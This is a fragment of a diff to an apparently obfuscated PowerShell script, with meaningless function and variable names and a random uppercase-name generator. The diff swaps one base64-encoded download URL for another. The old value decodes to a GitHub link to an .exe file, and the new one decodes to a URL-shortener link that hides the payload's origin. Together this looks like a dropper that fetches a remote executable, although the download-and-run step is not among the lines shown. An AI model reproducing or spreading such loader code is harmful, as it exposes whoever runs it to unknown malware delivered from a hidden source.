@@ -5,7 +5,7 @@ function f1 {
     return -join ((65..90) | Get-Random -Count $v1 | ForEach-Object { [char]$_ })
 }
 
-$e1 = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"
+$e1 = "aHR0cHM6Ly90aW55dXJsLmNvbS9sb2xvbG9sbzIzMjIyMg=="
 
 function f2 {
     param (
